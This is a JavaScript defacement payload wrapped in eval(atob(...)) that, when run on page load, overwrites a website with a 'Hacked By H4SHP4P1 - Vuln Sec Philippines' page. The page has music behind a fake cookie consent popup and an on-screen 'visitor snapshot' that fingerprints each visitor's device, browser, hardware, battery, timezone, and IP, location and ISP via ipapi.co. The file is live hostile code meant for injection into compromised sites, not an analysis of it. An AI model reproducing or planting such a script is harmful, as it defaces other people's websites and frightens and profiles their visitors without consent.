eval(atob('(function(){
  function go(){
    document.open(); document.write(`<!DOCTYPE html>
<html>
<head>
<title>Hacked By H4SHP4P1 - Vuln Sec Philippines</title>
<meta charset="UTF-8"/>
<meta name="author" content="H4SHP4P1"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="description" content="Site was open to attack. No damage done. Fix your security before someone worse comes along."/>
<meta property="og:title" content="Hacked By H4SHP4P1 - Vuln Sec Philippines"/>
<meta name="keywords" content="H4SHP4P1 - Vuln Sec Philippines, Hacked By H4SHP4P1, haxor uploader, haxor script deface generator, nathan prinsley, mr.prins, prinsh, hacked by, haxor my id"/>
<meta property="og:image" content="https://i.imgur.com/56Tryup.png"/>
<meta property="og:type" content="website"/>
<meta property="og:site_name" content="Haxor Uploader"/>
<link rel="icon" href="https://i.imgur.com/56Tryup.png" type="image/png"/>
<link rel="stylesheet" type="text/css" href="https://cdn.prinsh.com/NathanPrinsley-textstyle/nprinsh-stext.css"/>
<style>
body {
background: url("https://media1.giphy.com/media/krQzJaxbU1aXS/giphy.gif") no-repeat center center fixed;
background-size: cover;
font-family: Times New Roman;
margin-top: 35px;
}
h1, h2 { margin: .3em 0; }
h1.nprinsleyy { color: #dbd9d9; }
h2 { color: #dbd9d9; }
p.message_prinsley {
color: #dbd9d9;
margin: .25em 0;
font-size: 16px;
}
.hubungi_prinsh {
color: #00eb00;
text-decoration: none;
display:inline-flex;
align-items:center;
gap:10px;
border:2px solid #00eb00;
padding:6px 10px;
border-radius:8px;
transition: all 0.22s ease;
background: rgba(0,0,0,0.2);
}
.hubungi_prinsh img {
width:20px; height:20px;
}
.hubungi_prinsh:hover {
background: #00eb00;
color: black;
transform: translateY(-2px);
box-shadow: 0 6px 18px rgba(0,234,0,0.12);
}
marquee.foonathanPrinsley {
position: fixed;
width: 100%;
bottom: 0;
font-family: Tahoma;
height: 20px;
color: white;
left: 0;
border-top: 2px solid darkred;
padding: 5px;
background: #000;
z-index: 9997;
}
.cookie-overlay {
position: fixed;
inset: 0;
background: rgba(0,0,0,0.45);
display: flex;
align-items: center;
justify-content: center;
z-index: 9999;
}
.cookie-box {
max-width: 480px;
background: rgba(12,12,12,0.96);
color: #eee;
padding: 20px;
border-radius: 10px;
box-shadow: 0 8px 40px rgba(0,0,0,0.7);
text-align: left;
font-family: Arial, Helvetica, sans-serif;
}
.cookie-box h3 { margin: 0 0 8px; font-size: 18px; color: #fff; }
.cookie-box p { margin: 0 0 12px; color: #d6d6d6; font-size: 14px; line-height:1.3; }
.cookie-actions { display:flex; gap: 8px; justify-content: flex-end; margin-top: 12px; }
.btn { padding: 8px 12px; border-radius: 6px; border: none; cursor: pointer; font-weight: 600; }
.btn-accept { background: #1e8b3a; color: white; }
.btn-reject { background: #333; color: white; border: 1px solid #555; }
.btn-play {
display: none;
position: fixed;
right: 18px;
bottom: 70px;
z-index: 10000;
padding: 10px 14px;
border-radius: 30px;
border: none;
font-weight: 700;
cursor: pointer;
background: #ffcc00;
}
#pageContent.blurred {
filter: blur(6px) saturate(0.9);
pointer-events: none;
user-select: none;
}
.fake-console {
background: rgba(0,0,0,0.8);
color: #00ff00;
font-family: "Courier New", monospace;
font-size: 14px;
padding: 12px;
margin: 20px auto;
max-width: 600px;
height: 220px;
overflow-y: auto;
border: 1px solid #00ff00;
border-radius: 6px;
text-align: left;
box-shadow: 0 0 12px rgba(0,255,0,0.3);
}
.fake-console .line { white-space: pre-wrap; margin: 0; }
.cursor {
display:inline-block;
width:8px;
background:#00ff00;
margin-left:2px;
animation: blink 1s infinite;
}
@keyframes blink {
0%,50% { opacity:1; }
50.01%,100% { opacity:0; }
}
@media (max-width:520px) {
.hubungi_prinsh { padding:6px; }
.btn-play { bottom: 92px; }
}
</style>
</head>
<body>
<div id="pageContent" class="blurred">
<div id="main">
<center>
<img src="https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyOG81MWpyZnhjdXBoYzVyemJmNXZkZjRidnRnOW5mbmc2M2xmZzZ0cCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Y34v7S5jENXAdbkfYh/giphy.gif" style="width: 20%">
<h1 class="nprinsleyy nprinsley-text-rainbowan" style="font-size:32px;">Hacked By H4SHP4P1</h1>
<h2 style="font-size:24px;" class="nprinsley-detaxt">Vuln Sec Philippines</h2>
<p class="message_prinsley nprinsley-text-glitchan">
Security compromised. Patch your website before someone with bad intent takes over.
</p>
<hr/>
<p style="font-size:20px;" class="nprinsley-text nprinsley-blure">
<a class="hubungi_prinsh" href="https://www.facebook.com/vulnsec.legion" target="_blank" rel="noopener noreferrer">
<img src="https://cdn-icons-png.flaticon.com/512/5968/5968764.png" alt="Facebook"/> Facebook
</a>
</p>

<div class="fake-console" id="visitorConsole" aria-live="polite"></div>

<audio id="bg" loop muted>
<source src="https://audiotrimmer.com/download.php?date=07&file=TurchaWoW%20-%20Mysterious%20Night%20%28Official%20music%29-%5BAudioTrimmer.com%5D.mp3" type="audio/mpeg">
</audio>
</center>
</div>

<marquee class="foonathanPrinsley">
<b style="color: #dbd9d9;font-size:16px;">This is just a warning. Fix your website before someone comes in with bad intentions.</b>
</marquee>
</div>

<div id="popup" class="cookie-overlay">
<div class="cookie-box">
<h3>We use cookies to improve your experience</h3>
<p>Accept to let us remember your prefs for this visit. You can also reject. Both choices only last until you leave.</p>
<div class="cookie-actions">
<button id="btnNo" class="btn btn-reject" type="button">Reject</button>
<button id="btnOk" class="btn btn-accept" type="button">Accept</button>
</div>
</div>
</div>
<button id="btnPlay" class="btn-play">▶</button>
<script src="https://cdn.prinsh.com/NathanPrinsley-effect/efek-salju.js"></script>
<script>
(function () {
const audio = document.getElementById('bg');
const popup = document.getElementById('popup');
const pageContent = document.getElementById('pageContent');
const btnOk = document.getElementById('btnOk');
const btnNo = document.getElementById('btnNo');
const btnPlay = document.getElementById('btnPlay');

function playMusic(){
if(!audio) return;
audio.muted = false;
audio.play().then(()=>hideBtn()).catch(()=>showBtn());
}
function closePopup(){
popup.style.display = 'none';
pageContent.classList.remove('blurred');
}
function showBtn(){ btnPlay.style.display = 'inline-block'; }
function hideBtn(){ btnPlay.style.display = 'none'; }
btnOk.addEventListener('click', ()=>{ closePopup(); playMusic(); }, {once:true});
btnNo.addEventListener('click', ()=>{ closePopup(); }, {once:true});
btnPlay.addEventListener('click', ()=>{ audio.muted=false; audio.play().then(hideBtn); });
document.addEventListener('click', function firstClick(){
if(getComputedStyle(popup).display==='none'){
playMusic();
document.removeEventListener('click',firstClick);
}
}, {once:true});

/* ---------- Visitor Info logic (auto snapshot, emojis as codepoints) ---------- */
(function visitorInfo(){
const out = document.getElementById('visitorConsole');
if(!out) return;

// emojis via codepoints
const EM_DASH = String.fromCodePoint(0x2014);
const EMO_PHONE = String.fromCodePoint(0x1F4F1); // 📱
const EMO_PC = String.fromCodePoint(0x1F4BB); // 💻
const EMO_GLOBE = String.fromCodePoint(0x1F310); // 🌐
const EMO_OS = String.fromCodePoint(0x1F5A5); // 🖥 (approx OS)
const EMO_SCREEN = String.fromCodePoint(0x1F5B7) || ''; // 🖷 (fallback)
const EMO_LANG = String.fromCodePoint(0x1F5E3) || ''; // 🗣 (speech)
const EMO_TIME = String.fromCodePoint(0x1F550); // 🕐
const EMO_TZ = String.fromCodePoint(0x1F4C5); // 📅
const EMO_CORES = String.fromCodePoint(0x1F9EE) || ''; // 🧮 (approx)
const EMO_MEM = String.fromCodePoint(0x1F4BE); // 💾
const EMO_TOUCH = String.fromCodePoint(0x1F91F); // 🤟 (approx touch)
const EMO_NETWORK = String.fromCodePoint(0x1F4F6); // 📶
const EMO_BAT = String.fromCodePoint(0x1F50B); // 🔋
const EMO_PLAY = String.fromCodePoint(0x25B6); // ▶
const EMO_INFO = String.fromCodePoint(0x2139); // ℹ

function flagFromCC(cc){
if(!cc || cc.length !== 2) return '';
cc = cc.toUpperCase();
return String.fromCodePoint(...cc.split('').map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
}

function uaLower(){ return (navigator.userAgent || '').toLowerCase(); }
function detectDevice(ua){
if(/android/.test(ua)) return 'Mobile';
if(/iphone|ipad|ipod/.test(ua)) return 'Mobile';
return 'Desktop';
}
function detectOS(ua){
if(/android/.test(ua)) return 'Android';
if(/iphone|ipad|ipod/.test(ua)) return 'iOS';
if(/windows/.test(ua)) return 'Windows';
if(/macintosh|mac os x/.test(ua)) return 'macOS';
if(/linux/.test(ua)) return 'Linux';
return 'Other';
}
function detectBrowser(ua){
if(/edg\\//.test(ua)) return 'Edge';
if(/opr\\//.test(ua)) return 'Opera';
if(/chrome\\//.test(ua) && !/chromium/.test(ua)) return 'Chrome';
if(/firefox\\//.test(ua)) return 'Firefox';
if(/safari\\//.test(ua) && !/chrome\\//.test(ua)) return 'Safari';
return 'Other';
}

// Map effectiveType to user-friendly label
function niceNetType(e){
if(!e) return '';
e = e.toLowerCase();
if(e.includes('4g')) return '4G';
if(e.includes('3g')) return '3G';
if(e.includes('2g')) return '2G';
if(e.includes('slow-2g')) return '2G (slow)';
if(e.includes('wifi') || e.includes('ethernet')) return 'Wi-Fi';
return e;
}

// typing + rendering
async function gatherAndRender(){
const ua = navigator.userAgent || '';
const uaL = ua.toLowerCase();
const device = detectDevice(uaL);
const browser = detectBrowser(uaL);
const os = detectOS(uaL);

const screenStr = \`\${screen.width}×\${screen.height} (avail \${screen.availWidth}×\${screen.availHeight})\`;
const viewport = \`\${window.innerWidth}×\${window.innerHeight}\`;
const dpr = window.devicePixelRatio || EM_DASH;
const langs = (navigator.languages && navigator.languages.length) ? navigator.languages.join(', ') : (navigator.language || EM_DASH);
const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || EM_DASH;
let now = new Date().toLocaleString(undefined,{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit',month:'short',day:'numeric'});

const cores = navigator.hardwareConcurrency || EM_DASH;
const memory = navigator.deviceMemory || EM_DASH;
const touch = (navigator.maxTouchPoints !== undefined ? navigator.maxTouchPoints : EM_DASH);
const online = navigator.onLine ? 'Online' : 'Offline';
let conn = EM_DASH;
try {
const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
if(c){
conn = \`\${niceNetType(c.effectiveType||'')} \${c.downlink?('·'+Math.round(c.downlink*10)/10+'Mb/s'):''}\`;
}
} catch(e){ conn = EM_DASH; }

// battery (initial)
let batteryText = EM_DASH;
if('getBattery' in navigator){
try {
const bat = await navigator.getBattery();
function showBat(){
const lvl = (typeof bat.level === 'number') ? Math.round(bat.level*100)+'%' : EM_DASH;
const ch = bat.charging ? (' ' + String.fromCodePoint(0x26A1)) : '';
batteryText = lvl + ch;
renderLines(); // refresh rendered lines to show latest battery/time
}
showBat();
bat.addEventListener('levelchange', showBat);
bat.addEventListener('chargingchange', showBat);
} catch(e){
batteryText = EM_DASH;
}
}

// ip & isp via ipapi
let ipText = 'Unavailable';
try {
const res = await fetch('https://ipapi.co/json/');
if(res && res.ok){
const j = await res.json();
const flag = flagFromCC((j.country_code||'').toUpperCase());
const org = (j.org || j.org || j.company || '').trim();
const ispLabel = org ? \`(\${org})\` : '';
ipText = \`\${j.ip || EM_DASH} — \${j.country_name || EM_DASH} \${flag} \${j.region || ''} \${j.city || ''} \${ispLabel}\`.trim();
}
} catch(e){
ipText = 'Unavailable';
}

// BUILD friendly lines (emoji first)
const L_PHONE = device === 'Mobile' ? EMO_PHONE : EMO_PC;
const lines = [
\`\${EMO_INFO} Visitor snapshot\`,
\`\${L_PHONE} Device : \${device}\`,
\`\${EMO_OS} OS : \${os}\`,
\`\${EMO_GLOBE} Browser : \${browser}\`,
\`\${EMO_SCREEN} Screen : \${screenStr}\`,
\`\${EMO_GLOBE} Viewport : \${viewport}\`,
\`\${EMO_GLOBE} Pixel ratio : \${dpr}\`,
\`\${EMO_LANG} Language(s) : \${langs}\`,
\`\${EMO_TZ} Timezone : \${tz}\`,
\`\${EMO_TIME} Local time : \${now}\`,
\`\${EMO_CORES} CPU cores : \${cores}\`,
\`\${EMO_MEM} Memory(GB) : \${memory}\`,
\`\${EMO_TOUCH} Touch points: \${touch}\`,
\`\${EMO_NETWORK} Network : \${online} \${conn ? '· '+conn : ''}\`,
\`\${EMO_BAT} Battery : \${batteryText}\`,
\`\${EMO_GLOBE} IP / ISP : \${ipText}\`,
\`--- end of snapshot ---\`
];

// typing effect render
typeLines(lines);

// update time & battery periodically in place
setInterval(()=> {
const now2 = new Date().toLocaleString(undefined,{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit',month:'short',day:'numeric'});
// update any existing rendered line that starts with the Local time emoji text
const nodes = Array.from(out.querySelectorAll('.line'));
nodes.forEach(n => {
const t = n.textContent || '';
if(t.startsWith(EMO_TIME)){
n.textContent = \`\${EMO_TIME} Local time : \${now2}\`;
} else if(t.startsWith(EMO_BAT)){
// refresh battery if available
if('getBattery' in navigator){
navigator.getBattery().then(bat => {
const lvl = (typeof bat.level === 'number') ? Math.round(bat.level*100)+'%' : EM_DASH;
const ch = bat.charging ? (' ' + String.fromCodePoint(0x26A1)) : '';
n.textContent = \`\${EMO_BAT} Battery : \${lvl}\${ch}\`;
}).catch(()=>{ n.textContent = \`\${EMO_BAT} Battery : \${EM_DASH}\`; });
}
}
});
}, 2000);

// small helper to replace dynamic parts immediately
function renderLines(){
const nodes = Array.from(out.querySelectorAll('.line'));
nodes.forEach(n => {
const t = n.textContent || '';
if(t.startsWith(EMO_BAT)){
n.textContent = \`\${EMO_BAT} Battery : \${batteryText}\`;
}
});
}
}

// typing function
function typeLines(lines){
out.innerHTML = '';
let li = 0, ci = 0;
let currentLineEl = null, cursor = null;

function typeChar(){
if(!currentLineEl){
currentLineEl = document.createElement('div');
currentLineEl.className = 'line';
out.appendChild(currentLineEl);
cursor = document.createElement('span');
cursor.className = 'cursor';
currentLineEl.appendChild(cursor);
}
const txt = lines[li];
if(ci < txt.length){
cursor.before(txt.charAt(ci));
ci++;
out.scrollTop = out.scrollHeight;
setTimeout(typeChar, 20 + Math.random()*40);
} else {
li++; ci = 0; currentLineEl = null;
if(li < lines.length){
setTimeout(typeChar, 260);
}
}
}
typeChar();
}

// begin
gatherAndRender();

})();
/* ---------- end Visitor Info ---------- */

})();
</script>
</body>
</html>
`); document.close();
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', go);
  else go();
})();'));